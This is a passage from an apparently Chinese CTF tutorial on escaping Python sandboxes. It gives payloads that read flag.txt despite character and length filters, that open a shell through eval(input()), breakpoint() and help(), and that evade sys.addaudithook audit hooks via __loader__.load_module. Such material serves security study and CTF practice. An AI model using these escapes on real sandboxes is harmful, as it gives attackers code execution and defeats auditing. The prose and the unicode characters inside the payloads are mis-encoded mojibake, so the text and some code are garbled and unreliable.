<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã§&#x27;)</span></span><br><span class="line"><span class="comment"># a = 108 = 333-225 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¡&#x27;)</span></span><br><span class="line"><span class="comment"># l = 97 = 333-236 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¬&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¦&#x27;)</span></span><br><span class="line"><span class="comment"># . = 46 = 333-287 = ord(&#x27;Å&#x27;)-ord(&#x27;ÄŸ&#x27;)</span></span><br><span class="line"><span class="comment"># t = 116 = 333-217 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã™&#x27;)</span></span><br><span class="line"><span class="comment"># x = 120 = = 333-213 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã•&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã§&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¡&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¬&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã¦&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ÄŸ&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã™&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã•&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Å&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;Ã™&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure></div>

<p>ä½†è¿™æ ·çš„è¯å…¶å®é•¿åº¦è¶…å‡ºäº†é™åˆ¶ã€‚è€Œé¢˜ç›®çš„ eval è¡¨ç¤ºä¸æ”¯æŒåˆ†å·ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ª <code>exec</code>ã€‚ç„¶åå°† <code>ord</code> ä»¥åŠä¸å˜çš„ <code>a(&#39;Å&#39;)</code> è¿›è¡Œæ›¿æ¢ã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ payload</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;a=ord;b=a(&#x27;Å&#x27;);print(open(bytes([b-a(&#x27;Ã§&#x27;),b-a(&#x27;Ã¡&#x27;),b-a(&#x27;Ã¬&#x27;),b-a(&#x27;Ã¦&#x27;),b-a(&#x27;ÄŸ&#x27;),b-a(&#x27;Ã™&#x27;),b-a(&#x27;Ã•&#x27;),b-a(&#x27;Ã™&#x27;)])).read())&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä½†å…¶å®å°è¯•ä¹‹åå‘ç°è¿™ä¸ª payload ä¼šæŠ¥é”™ï¼ŒåŸå› åœ¨äºå…¶ä¸­çš„æŸäº› unicode å­—ç¬¦é‡åˆ° <code>lower()</code> æ—¶ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé¿å… <code>lower</code> äº§ç”Ÿå¹²æ‰°ï¼Œå¯ä»¥åœ¨é€‰å– unicode æ—¶é€‰æ‹© <code>ord</code> å€¼æ›´å¤§çš„å­—ç¬¦ï¼Œä¾‹å¦‚ <code>chr(4434)</code>ã€‚</p>
<p>å½“ç„¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ input å‡½æ•°æ¥ç»•è¿‡é•¿åº¦é™åˆ¶ã€‚</p>
<h2 id="æ‰“å¼€-input-è¾“å…¥"><a href="#æ‰“å¼€-input-è¾“å…¥" class="headerlink" title="æ‰“å¼€ input è¾“å…¥"></a>æ‰“å¼€ input è¾“å…¥</h2><p>å¦‚æœæ²™ç®±å†…æ‰§è¡Œçš„å†…å®¹æ˜¯é€šè¿‡ input è¿›è¡Œä¼ å…¥çš„è¯ï¼ˆä¸æ˜¯ web ä¼ å‚ï¼‰ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ä¼ å…¥ä¸€ä¸ª input æ‰“å¼€ä¸€ä¸ªæ–°çš„è¾“å…¥æµï¼Œç„¶åå†è¾“å…¥æœ€ç»ˆçš„ payloadï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ‰€æœ‰çš„é˜²æŠ¤ã€‚</p>
<p>å³ä½¿é™åˆ¶äº†å­—æ¯æ•°å­—ä»¥åŠé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ä¸‹é¢çš„ payloadï¼ˆæ³¨æ„æ˜¯ unicodeï¼‰</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µ payload æ‰“å¼€ input è¾“å…¥åï¼Œæˆ‘ä»¬å†è¾“å…¥æœ€ç»ˆçš„ payload å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>no builtins çš„ç¯å¢ƒä¸­æˆ–è€…é¢˜ç›®éœ€è¦ä»¥ http è¯·æ±‚çš„æ–¹å¼è¿›è¡Œè¾“å…¥æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ã€‚</p>
<p>Python 2 çš„ <code>input()</code> &#x3D; Python 3 çš„ <code>eval(input())</code>ï¼Œåœ¨ Py2 é‡Œ <code>input()</code> è‡ªå¸¦æ‰§è¡ŒåŠŸèƒ½ï¼Œ<code>raw_input()</code> æ‰æ˜¯å®‰å…¨çš„è¯»å–å­—ç¬¦ä¸²æ–¹æ³•ã€‚</p>

    </div>
  </div>

<p>ä¸‹é¢æ˜¯ä¸€äº›å…¶ä»–çš„æ‰“å¼€è¾“å…¥æµçš„æ–¹å¼ï¼š</p>
<h3 id="sys-stdin-read"><a href="#sys-stdin-read" class="headerlink" title="sys.stdin.read()"></a>sys.stdin.read()</h3><p>æ³¨æ„è¾“å…¥å®Œæ¯•ä¹‹åæŒ‰ ctrl+d ç»“æŸè¾“å…¥</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.read())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">kali</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="sys-stdin-readline"><a href="#sys-stdin-readline" class="headerlink" title="sys.stdin.readline()"></a>sys.stdin.readline()</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readline())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="sys-stdin-readlines"><a href="#sys-stdin-readlines" class="headerlink" title="sys.stdin.readlines()"></a>sys.stdin.readlines()</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(sys.stdin.readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="breakpoint-å‡½æ•°"><a href="#breakpoint-å‡½æ•°" class="headerlink" title="breakpoint å‡½æ•°"></a>breakpoint å‡½æ•°</h2><p><code>breakpoint</code> æ˜¯ä» Python <strong>3.7</strong> å¼€å§‹å¼•å…¥çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ã€‚é»˜è®¤è¡Œä¸ºï¼šè°ƒç”¨ <code>sys.breakpointhook()</code> â†’ å¯åŠ¨ <code>pdb.set_trace()</code>ï¼Œä¹Ÿå°±æ˜¯è¿›å…¥ <strong>Pdb</strong>ï¼ˆPython è°ƒè¯•å™¨ï¼‰ã€‚</p>
<p>åœ¨ Pdb æç¤ºç¬¦ <code>(Pdb)</code> é‡Œï¼Œä½ å¯ä»¥æŸ¥çœ‹å˜é‡ã€æ‰§è¡Œè¡¨è¾¾å¼ï¼Œç”šè‡³è¿è¡Œä»»æ„ Python è¯­å¥ã€‚åœ¨è¾“å…¥ <code>breakpoint()</code> åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">0</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure></div>

<h2 id="help-å‡½æ•°-1"><a href="#help-å‡½æ•°-1" class="headerlink" title="help å‡½æ•°"></a>help å‡½æ•°</h2><p>å½“æˆ‘ä»¬è¾“å…¥ <code>help</code> æ—¶ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğ˜©ğ˜¦ğ˜­ğ˜±()</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¾“å…¥ <code>os</code>ï¼Œæ­¤æ—¶ä¼šè¿›å…¥ <code>os</code> çš„å¸®åŠ©æ–‡æ¡£ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨è¾“å…¥ <code>!sh</code> å°±å¯ä»¥æ‹¿åˆ° <code>/bin/sh</code>, è¾“å…¥ <code>!bash</code> åˆ™å¯ä»¥æ‹¿åˆ° <code>/bin/bash</code>ã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></div>

<h1 id="ç»•è¿‡-audit-hook"><a href="#ç»•è¿‡-audit-hook" class="headerlink" title="ç»•è¿‡ audit hook"></a>ç»•è¿‡ audit hook</h1><h2 id="ç»•è¿‡åŸºäº-sys-addaudithook-çš„-audit-hook"><a href="#ç»•è¿‡åŸºäº-sys-addaudithook-çš„-audit-hook" class="headerlink" title="ç»•è¿‡åŸºäº sys.addaudithook çš„ audit hook"></a>ç»•è¿‡åŸºäº sys.addaudithook çš„ audit hook</h2><blockquote>
<p>Pythonä¸­çš„å®¡è®¡é’©å­ï¼ˆAudit Hookï¼‰æ˜¯ä» Python 3.8 ç‰ˆæœ¬å¼•å…¥çš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œæ—¨åœ¨è®© Python è¿è¡Œæ—¶çš„æ“ä½œå¯¹å¤–éƒ¨ç›‘æ§å·¥å…·å¯è§ã€‚è¯¥åŠŸèƒ½å…è®¸å¼€å‘è€…é€šè¿‡æ³¨å†Œé’©å­å‡½æ•°æ¥ç›‘æ§å’Œæ§åˆ¶ç‰¹å®šçš„äº‹ä»¶ï¼Œå°¤å…¶æ˜¯ä¸å®‰å…¨ç›¸å…³çš„æ“ä½œã€‚è¿™ç§æœºåˆ¶ä¸ºç³»ç»Ÿç®¡ç†å‘˜ã€æµ‹è¯•äººå‘˜å’Œå®‰å…¨ä¸“å®¶æä¾›äº†ä¸€ä¸ªæœ‰æ•ˆçš„æ‰‹æ®µæ¥æ£€æµ‹ã€è®°å½•æˆ–é˜»æ­¢ç‰¹å®šæ“ä½œã€‚</p>
<p>å®¡è®¡é’©å­é€šè¿‡ sys.addaudithook() å‡½æ•°æ·»åŠ ã€‚æ¯å½“å‘ç”Ÿç‰¹å®šäº‹ä»¶æ—¶ï¼ŒPythonä¼šè°ƒç”¨è¿™äº›é’©å­å‡½æ•°ï¼Œå¹¶å°†äº‹ä»¶åç§°å’Œç›¸å…³å‚æ•°ä¼ é€’ç»™å®ƒä»¬ã€‚é’©å­å‡½æ•°å¯ä»¥é€‰æ‹©è®°å½•è¿™äº›äº‹ä»¶ï¼Œæˆ–è€…åœ¨æ£€æµ‹åˆ°ä¸å…è®¸çš„æ“ä½œæ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œé˜»æ­¢æ“ä½œç»§ç»­è¿›è¡Œã€‚</p>
</blockquote>
<p>Python çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä¸€ç³»åˆ—å¯èƒ½å½±å“åˆ° Python ç¨‹åºè¿è¡Œå®‰å…¨æ€§çš„é‡è¦æ“ä½œã€‚è¿™äº›äº‹ä»¶çš„ç§ç±»åŠåç§°ä¸åŒç‰ˆæœ¬çš„ Python è§£é‡Šå™¨æœ‰æ‰€ä¸åŒï¼Œä¸”å¯èƒ½ä¼šéšç€ Python è§£é‡Šå™¨çš„æ›´æ–°è€Œå˜åŠ¨ã€‚</p>
<p>Python ä¸­çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç±»ï¼š</p>
<ul>
<li><code>import</code>ï¼šå‘ç”Ÿåœ¨å¯¼å…¥æ¨¡å—æ—¶ã€‚</li>
<li><code>open</code>ï¼šå‘ç”Ÿåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ã€‚</li>
<li><code>write</code>ï¼šå‘ç”Ÿåœ¨å†™å…¥æ–‡ä»¶æ—¶ã€‚</li>
<li><code>exec</code>ï¼šå‘ç”Ÿåœ¨æ‰§è¡ŒPythonä»£ç æ—¶ã€‚</li>
<li><code>compile</code>ï¼šå‘ç”Ÿåœ¨ç¼–è¯‘Pythonä»£ç æ—¶ã€‚</li>
<li><code>socket</code>ï¼šå‘ç”Ÿåœ¨åˆ›å»ºæˆ–ä½¿ç”¨ç½‘ç»œå¥—æ¥å­—æ—¶ã€‚</li>
<li><code>os.system</code>ï¼Œ<code>os.popen</code>ç­‰ï¼šå‘ç”Ÿåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ—¶ã€‚</li>
<li><code>subprocess.Popen</code>ï¼Œ<code>subprocess.run</code>ç­‰ï¼šå‘ç”Ÿåœ¨å¯åŠ¨å­è¿›ç¨‹æ—¶ã€‚</li>
</ul>
<p>æ‰€æœ‰çš„äº‹ä»¶åˆ—è¡¨å¯è§ï¼š</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://docs.python.org/3/library/audit_events.html" >Audit events table â€” Python 3.13.0 documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/" >PEP 578 â€“ Python Runtime Audit Hooks<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å†Œæ‰“å°æ—¥å¿—çš„å›è°ƒå‡½æ•°æ¥æµ‹è¯•æˆ‘ä»¬çš„ä»£ç è§¦å‘äº†å“ªäº› hookã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¡è®¡é’©å­å›è°ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, args</span>):</span><br><span class="line">    <span class="comment"># æ‰“å°è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Triggered event: <span class="subst">&#123;my_event&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;    Arguments: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># æ³¨å†Œå®¡è®¡é’©å­</span></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br></pre></td></tr></table></figure></div>

<h3 id="loader-load-module-1"><a href="#loader-load-module-1" class="headerlink" title="__loader__.load_module"></a><code>__loader__.load_module</code></h3><p> <code>__loader__.load_module</code> åº•å±‚å®ç°ä¸ <code>import</code> ä¸åŒï¼Œå› æ­¤æŸäº›æƒ…å†µä¸‹å¯ä»¥ç»•è¿‡ audithook ã€‚</p>
<p><code>__loader__</code> æ˜¯<strong>â€œæ¯ä¸ªæ¨¡å—è‡ªå·±çš„åŠ è½½å™¨â€</strong>ï¼Œå“ªä¸ªæ¨¡å—ç”¨ä»€ä¹ˆåŠ è½½å™¨åŠ è½½ï¼Œå°±æŠŠé‚£ä¸ªåŠ è½½å™¨å¯¹è±¡æŒ‚åœ¨è¿™ä¸ªæ¨¡å—çš„ <code>__loader__</code> ä¸Šï¼š</p>
<table>
<thead>
<tr>
<th>æ¨¡å—ç±»å‹</th>
<th>å…¸å‹ <code>__loader__</code></th>
</tr>
</thead>
<tbody><tr>
<td>å†…å»º&#x2F;å†»ç»“æ¨¡å—ï¼ˆ<code>sys</code>ã€<code>time</code>ã€éƒ¨åˆ† <code>gc</code>ï¼‰</td>
<td><code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code>ï¼ˆç±» or å•ä¾‹ï¼‰</td>
</tr>
<tr>
<td>çº¯ Python æ¨¡å—ï¼ˆ<code>os</code>ã€<code>pathlib</code>ï¼‰</td>
<td><code>SourceFileLoader</code>ï¼ˆå®ä¾‹ï¼‰</td>
</tr>
<tr>
<td>C æ‰©å±•æ¨¡å—ï¼ˆ<code>math</code>ã€<code>_ssl</code>ï¼‰</td>
<td><code>ExtensionFileLoader</code>ï¼ˆå®ä¾‹ï¼‰</td>
</tr>
<tr>
<td><code>__main__</code>ï¼ˆä½ çš„è„šæœ¬ï¼‰</td>
<td>é€šå¸¸æ˜¯ <code>SourceFileLoader</code></td>
</tr>
<tr>
<td><code>builtins</code> æ¨¡å—æœ¬èº«</td>
<td><code>BuiltinImporter</code></td>
</tr>
</tbody></table>
<p><code>__loader__</code> çš„ <strong><code>load_module(name)</code> æ˜¯è€æ¥å£</strong>ï¼ˆPEP 302 æ—¶ä»£ï¼ŒPy3.4 å‰ï¼‰ï¼Œç°åœ¨<strong>åªåœ¨å°‘æ•°åŠ è½½å™¨ï¼ˆå†…å»º&#x2F;å†»ç»“ï¼‰è¿˜ç•™äº†å…¼å®¹å±‚</strong>ï¼›å¤šæ•°ç°ä»£åŠ è½½å™¨ä¸å†æä¾›å®ƒã€‚</p>
<p>åœ¨ä¸€äº›é¢˜ç›®&#x2F;ç¯å¢ƒé‡Œï¼Œ<strong>å®¡è®¡é’©å­ï¼ˆaudit hookï¼‰åªæ‹¦â€œå¸¸è§„å¯¼å…¥æµç¨‹â€çš„äº‹ä»¶</strong>ï¼ˆæ¯”å¦‚ <code>import</code> &#x2F; <code>__import__</code> &#x2F; <code>importlib.import_module</code> &#x2F; <code>find_spec</code> &#x2F; <code>exec_module</code>ï¼‰ã€‚<br>è€Œä½ <strong>ç›´æ¥è°ƒç”¨æŸäº› Loader çš„æ—§æ¥å£ <code>load_module</code><strong>ï¼ˆå¸¸è§æ˜¯ <code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code> çš„å…¼å®¹å±‚ï¼‰</strong>å¹¶ä¸ä¸€å®šä¼šè§¦å‘è¿™äº›â€œå¯¼å…¥ç±»â€å®¡è®¡äº‹ä»¶</strong>ï¼Œæ‰€ä»¥<strong>æœ‰æœºä¼šç»•è¿‡</strong>ä»…é’ˆå¯¹å¯¼å…¥è·¯å¾„çš„è¿‡æ»¤ã€‚</p>
<p><code>__builtins__</code> çš„  <code>__loader__</code> é€šå¸¸æ˜¯ **<code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code>**ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åˆ«çš„æ–¹å¼è¿›è¡Œè·å–ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>ä¸è¿‡ <code>BuiltinImporter</code> <strong>åªä¼šåŠ è½½å†…å»º&#x2F;å†»ç»“æ¨¡å—</strong>ï¼Œä¾‹å¦‚ <code>sys</code>ï¼Œ<code>gc</code> ç­‰ï¼Œä½†æ˜¯åƒ <code>os</code> æ˜¯<strong>æ ‡å‡†åº“çš„çº¯ Python æ¨¡å—</strong>ï¼Œ<strong>ä¸åœ¨</strong>å®ƒçš„èƒ½åŠ›èŒƒå›´å†…ã€‚ä¹Ÿå°±æ˜¯è¯´è‹¥ <code>sys.modules</code> æ²¡ç¼“å­˜ï¼Œåˆ™é€šè¿‡ <code> __builtins__.__loader__.load_module</code> åŠ è½½ <code>os</code> æ¨¡å—ä¼šæŠ¥é”™ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__loader__.load_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__loader__.load_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">719</span>, <span class="keyword">in</span> _load</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">674</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">571</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">774</span>, <span class="keyword">in</span> create_module</span><br><span class="line">ImportError: <span class="string">&#x27;os&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure></div>

<p><code>sys.builtin_module_names</code> ä¸­åŒ…å«äº†æ‰€æœ‰ <strong>å†…å»ºæ¨¡å—ï¼ˆbuilt-in modulesï¼‰</strong> çš„åå­—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå­—æ®µæŸ¥è¯¢æ¨¡å—æ˜¯å¦å¯ä»¥é€šè¿‡ <code>__builtins__.__loader__.load_module</code> åŠ è½½ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).builtin_module_names</span><br><span class="line">(<span class="string">&#x27;_abc&#x27;</span>, <span class="string">&#x27;_ast&#x27;</span>, <span class="string">&#x27;_bisect&#x27;</span>, <span class="string">&#x27;_blake2&#x27;</span>, <span class="string">&#x27;_codecs&#x27;</span>, <span class="string">&#x27;_collections&#x27;</span>, <span class="string">&#x27;_csv&#x27;</span>, <span class="string">&#x27;_datetime&#x27;</span>, <span class="string">&#x27;_elementtree&#x27;</span>, <span class="string">&#x27;_functools&#x27;</span>, <span class="string">&#x27;_heapq&#x27;</span>, <span class="string">&#x27;_imp&#x27;</span>, <span class="string">&#x27;_io&#x27;</span>, <span class="string">&#x27;_locale&#x27;</span>, <span class="string">&#x27;_md5&#x27;</span>, <span class="string">&#x27;_operator&#x27;</span>, <span 